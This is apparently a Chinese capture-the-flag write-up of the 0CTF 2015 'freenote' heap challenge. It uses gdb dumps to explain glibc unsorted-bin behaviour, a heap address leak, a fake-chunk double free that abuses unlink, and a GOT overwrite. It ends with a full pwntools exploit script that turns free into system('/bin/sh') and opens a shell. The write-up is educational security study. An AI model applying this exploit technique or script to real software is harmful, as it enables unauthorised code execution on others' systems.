---
title: 0CTF freenote
author: rk700
layout: post
redirect_from: /writeup/2015/04/21/0ctf-freenote
tags:
  - exploit
---

这道题目是关于heap overflow的。之前没有接触过这方面。通过阅读[http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up](http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up), [http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up](http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up)这两篇writeup，基本上明白了原理，在此记录。

此外，关于glibc malloc的基本知识，可以参考[https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/)

首先，创建4个大小为1的note（大小会被自动近似到128），内容为`"a"`

{% highlight bash %}
gdb-peda$ vmmap 
Start              End                Perm      Name
0x00400000         0x00402000         r-xp      /root/freenote
0x00601000         0x00602000         r--p      /root/freenote
0x00602000         0x00603000         rw-p      /root/freenote
0x00603000         0x00625000         rw-p      [heap]
...
{% endhighlight %}

heap从`0x603000`开始。我们具体地去看那些chunks:

{% highlight bash %}
gdb-peda$ x/4gx 0x603000
0x603000:       0x0000000000000000      0x0000000000001821
0x603010:       0x0000000000000100      0x0000000000000004
gdb-peda$ x/4gx 0x603000+0x1820
0x604820:       0x0000000000000000      0x0000000000000091
0x604830:       0x0000000000000061      0x0000000000000000
gdb-peda$ x/4gx 0x604820+0x90
0x6048b0:       0x0000000000000000      0x0000000000000091
0x6048c0:       0x0000000000000061      0x0000000000000000
gdb-peda$ x/4gx 0x6048b0+0x90
0x604940:       0x0000000000000000      0x0000000000000091
0x604950:       0x0000000000000061      0x0000000000000000
gdb-peda$ x/4gx 0x604940+0x90
0x6049d0       0x0000000000000000      0x0000000000000091
0x6049e0:       0x0000000000000061      0x0000000000000000
gdb-peda$ x/4gx 0x6049d0+0x90
0x604a60:       0x0000000000000000      0x00000000000205a1
0x604a70:       0x0000000000000000      0x0000000000000000
{% endhighlight %}

分给4个128 bytes的notes的chunks从`0x604820`开始，其内容均为我们提供的`"a"=0x61`。而打印`main_arena`，可以看到`0x604a60`那里就是top chunk

{% highlight bash %}
gdb-peda$ p main_arena 
$6 = {
  mutex = 0x0, 
  flags = 0x1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x604a60, 
  last_remainder = 0x0, 
  bins = {0x7ffff7dd67b8 <main_arena+88>, 0x7ffff7dd67b8 <main_arena+88>,...
{% endhighlight %}

这些chunk的大小都足够大，不会用到fastbin。而到目前为止还没有`free`，bins里也是没有chunks的：

{% highlight bash %}
gdb-peda$ x/4gx 0x7ffff7dd67b8
0x7ffff7dd67b8 <main_arena+88>: 0x0000000000604a60      0x0000000000000000
0x7ffff7dd67c8 <main_arena+104>:        0x00007ffff7dd67b8      0x00007ffff7dd67b8
{% endhighlight %}

然后，我们`free`掉第0个note，位于`0x604820`：

{% highlight bash %}
gdb-peda$ p main_arena 
$7 = {
  mutex = 0x0, 
  flags = 0x1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x604a60, 
  last_remainder = 0x0, 
  bins = {0x604820, 0x604820, 0x7ffff7dd67c8 <main_arena+104>,...
{% endhighlight %}

可以看到，`0x604820`出现在了`bins`的第1个和第2个，应该是传说中的unsorted bin了，这里chunks是双向链表：

{% highlight bash %}
gdb-peda$ x/4gx 0x604820
0x604820:       0x0000000000000000      0x0000000000000091
0x604830:       0x00007ffff7dd67b8      0x00007ffff7dd67b8
gdb-peda$ x/4gx 0x604820+0x90
0x6048b0:       0x0000000000000090      0x0000000000000090
0x6048c0:       0x0000000000000061      0x0000000000000000
gdb-peda$ x/4gx 0x00007ffff7dd67b8
0x7ffff7dd67b8 <main_arena+88>: 0x0000000000604a60      0x0000000000000000
0x7ffff7dd67c8 <main_arena+104>:        0x0000000000604820      0x0000000000604820
{% endhighlight %}

然后，我们`free`掉第2个note，位于`0x604940`：

{% highlight bash %}
gdb-peda$ p main_arena 
$8 = {
  mutex = 0x0, 
  flags = 0x1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x604a60, 
  last_remainder = 0x0, 
  bins = {0x604940, 0x604820, 0x7ffff7dd67c8 <main_arena+104>,
{% endhighlight %}

这里`bins[0]`是刚刚`free`掉的`0x604940`，而`bins[1]`是最开始`free`掉的`0x604820`。free chunks的链表如下：

{% highlight bash %}
gdb-peda$ x/4gx 0x604940
0x604940:       0x0000000000000000      0x0000000000000091
0x604950:       0x0000000000604820      0x00007ffff7dd67b8
gdb-peda$ x/4gx 0x604820
0x604820:       0x0000000000000000      0x0000000000000091
0x604830:       0x00007ffff7dd67b8      0x0000000000604940
gdb-peda$ x/4gx 0x00007ffff7dd67b8
0x7ffff7dd67b8 <main_arena+88>: 0x0000000000604a60      0x0000000000000000
0x7ffff7dd67c8 <main_arena+104>:        0x0000000000604940      0x0000000000604820
{% endhighlight %}

于是，`0x604820`那里的`bk`，即位于`0x604838`的`0x604940`，指向的就是note2的chunk的地址。那么接下来，我们再创建一个同样大小的note（长度为8, 被近似到128进行`malloc`），那么就会被分配到最开始`free`的`0x604820`那里（因为bins是FIFO）。我们提供的8 bytes的内容之后，紧跟着的就是`bk`。由此。通过打印这个刚刚创建的note的内容，就可以在我们提供的8 bytes后面得到某个chunk的地址，进而得到heap的地址。

下面是我们`free`掉note2后再创建新note的情况：

{% highlight bash %}
gdb-peda$ p main_arena 
$9 = {
  mutex = 0x0, 
  flags = 0x1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x604a60, 
  last_remainder = 0x0, 
  bins = {0x604940, 0x604940, 0x7ffff7dd67c8 <main_arena+104>,...
{% endhighlight %}

可以看到，`0x604820`被新创建的note用掉了，所以被从bins双向链表里去掉了：

{% highlight bash %}
gdb-peda$ x/4gx 0x604940
0x604940:       0x0000000000000000      0x0000000000000091
0x604950:       0x00007ffff7dd67b8      0x00007ffff7dd67b8
gdb-peda$ x/4gx 0x00007ffff7dd67b8
0x7ffff7dd67b8 <main_arena+88>: 0x0000000000604a60      0x0000000000000000
0x7ffff7dd67c8 <main_arena+104>:        0x0000000000604940      0x0000000000604940
{% endhighlight %}

查看这个新note的内容：

{% highlight bash %}
gdb-peda$ x/4gx 0x604820
0x604820:       0x0000000000000000      0x0000000000000091
0x604830:       0x3837363534333231      0x0000000000604940
{% endhighlight %}

看到我们提供的内容`"12345678"=0x3837363534333231`之后就是`bk`指针，没有被破坏掉，我们通过打印note内容就可以得到这一地址。

通过[villoc](https://github.com/wapiflapi/villoc)，我们可以将刚才的过程用图片显示出来：

{::nomarkdown}
<iframe width="100%" height="666px" src=/img/in-posts/0ctf-freenote/1.html></iframe>
{:/nomarkdown}

有了heap的地址，我们就可以创建一个伪chunk，这个chunk是已经free的，其`fd`和`bk`指向heap上的某处，具体地，`fd->bk=bk->fd=ptr`。这里我们先创建note0，其内容中包含我们构造的伪chunk；然后创建note1，内容是`/bin/sh`用来后面调用`system`；然后再创建note2，其内容中包含多个构造的chunk

具体地，我们创建完这3个note后，真正的chunks如下

{% highlight bash %}
gdb-peda$ x/4gx 0x604820
0x604820:       0x0000000000000000      0x0000000000000091
0x604830:       0x0000000000000000      0x00000000000001a1
gdb-peda$ x/4gx 0x604820+0x90
0x6048b0:       0x0000000000000090      0x0000000000000091
0x6048c0:       0x0068732f6e69622f      0x0000000000000000
gdb-peda$ x/4gx 0x6048b0+0x90
0x604940:       0x0000000000000000      0x0000000000000291
0x604950:       0x6161616161616161      0x6161616161616161
gdb-peda$ x/4gx 0x604940+0x290
0x604bd0:       0x0000000000000000      0x0000000000020431
0x604be0:       0x0000000000000000      0x0000000000000000
{% endhighlight %}

但如果从伪chunks来看，其布局是这样的：
{% highlight bash %}
gdb-peda$ x/4gx 0x604830
0x604830:       0x0000000000000000      0x00000000000001a1
0x604840:       0x0000000000603018      0x0000000000603020
gdb-peda$ x/4gx 0x604830+0x1a0
0x6049d0:       0x00000000000001a0      0x0000000000000090
0x6049e0:       0x6161616161616161      0x6161616161616161
gdb-peda$ x/4gx 0x6049d0+0x90
0x604a60:       0x0000000000000000      0x0000000000000091
0x604a70:       0x6161616161616161      0x6161616161616161
gdb-peda$ x/4gx 0x604a60+0x90
0x604af0:       0x0000000000000000      0x0000000000000091
0x604b00:       0x6161616161616161      0x6161616161616161
gdb-peda$ x/4gx 0x604af0+0x91
0x604b81:       0x0000000000000000      0x0000000000000000
0x604b91:       0x0000000000000000      0x0000000000000000
{% endhighlight %}

`0x604830`处的伪chunk是已经free的了，可以从`0x6049d8`处看出；而`fd=0x603018`，`bk=0x603020`，满足`fd->bk = bk->fd = ptr = 0x604830`。这是因为`0x604830`作为note字符串的地址，被存在heap上了:

{% highlight bash %}
gdb-peda$ x/gx 0x603030
0x603030:       0x0000000000604830
{% endhighlight %}

这也是我们第一步需要heap的基址的原因。

然后，我们删除掉note3。因为第一次创建note3所分配的chunk恰好就是`0x6049d0`，在第一次删除note3的时候这个地址没有被更改；然后我们的伪chunk也在`0x6049d0`，于是double free。而现在`0x6049d0`这个伪chunk的内容完全是我们控制的。具体地，这个chunk不是free的（`0x604a68`），前面的是已经free的`0x604830`，后面是`0x604a60`，也不是free的（`0x604af8`）。于是这两个chunk会被合并，具体地，`0x604830`会从双向链表上去掉，与`0x6049d0`合并之后，插入到unsorted bin。在`0x604830`从双向链表上去掉时发生`unlink`，造成修改。

删除掉note3，我们看到合并之后的`0x604830`，大小是`0x1a0+0x90=0x230`，被放到了bins[0]，即unsorted bin:

{% highlight bash %}
gdb-peda$ p main_arena 
$15 = {
  mutex = 0x0, 
  flags = 0x1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x604bd0, 
  last_remainder = 0x0, 
  bins = {0x604830, 0x604830, 0x7ffff7dd67c8 <main_arena+104>, ...
gdb-peda$ x/4x 0x604830
0x604830:       0x0000000000000000      0x0000000000000231
0x604840:       0x00007ffff7dd67b8      0x00007ffff7dd67b8
{% endhighlight %}

在`unlink`过程中，我们把在heap上的之前存note0字符串地址的地方改了：

{% highlight bash %}
gdb-peda$ x/gx 0x603030
0x603030:       0x0000000000603018
{% endhighlight %}

于是接下来，我们如果修改note0，就相当于修改了那个所有note结构数组，即可以将note0的字符串地址改为`free@got`。由此，我们就可以通过读、写note的内容，做到读、写`free@got`。最后是这样将`free@got`改为`system`，那么在删除note2的时候，就发生了`system("/bin/sh")`。


下面是最后的代码

{% highlight python %}
#!/usr/bin/env python2

from pwn import *  #pip install pwntools

r = remote('127.0.0.1', 9990)

f = open("payload", "wb")

def newnote(x):
    r.recvuntil('Your choice: ')
    r.send('2\n')
    f.write('2\n')
    r.recvuntil('Length of new note: ')
    r.send(str(len(x)) + '\n')
    f.write(str(len(x)) + '\n')
    r.recvuntil('Enter your note: ')
    r.send(x)
    f.write(x)

def delnote(x):
    r.recvuntil('Your choice: ')
    r.send('4\n')
    f.write('4\n')
    r.recvuntil('Note number: ')
    r.send(str(x) + '\n')
    f.write(str(x) + '\n')

def getnote(x):
    r.recvuntil('Your choice: ')
    r.send('1\n')
    f.write('1\n')
    r.recvuntil('%d. ' % x)
    return r.recvline(keepends=False)

def editnote(x, s):
    r.recvuntil('Your choice: ')
    r.send('3\n')
    f.write('3\n')
    r.recvuntil('Note number: ')
    r.send(str(x) + '\n')
    f.write(str(x) + '\n')
    r.recvuntil('Length of note: ')
    r.send(str(len(s)) + '\n')
    f.write(str(len(s)) + '\n')
    r.recvuntil('Enter your note: ')
    r.send(s)
    f.write(s)

def quit():
    r.recvuntil('Your choice: ')
    r.send('5\n')
    f.write('5\n')

for i in range(4):
    newnote('a')
delnote(0)
delnote(2)

newnote('12345678')

s = getnote(0)[8:]
heap_addr = u64((s.ljust(8, "\x00"))[:8])
heap_base = heap_addr - 0x1940
print "heap base is at %s" % hex(heap_base)


delnote(0)
delnote(1)
delnote(3)

size0 = 128+0x90+0x90
newnote(p64(0)+p64(size0+1)+p64(heap_base+0x18)+p64(heap_base+0x20))
newnote("/bin/sh\x00")
newnote("a"*128+p64(size0)+p64(0x90)+"a"*128+(p64(0)+p64(0x91)+"a"*128)*2)
delnote(3)

free_got = 0x602018
free2system = -0x3b6a0

editnote(0, p64(100)+p64(1)+p64(8)+p64(free_got))

s = getnote(0)
free_addr = u64((s.ljust(8, "\x00"))[:8])
system_addr = free_addr + free2system
print "system is at %s" % hex(system_addr)

editnote(0, p64(system_addr))
delnote(1)
f.close()
r.interactive()
{% endhighlight %}
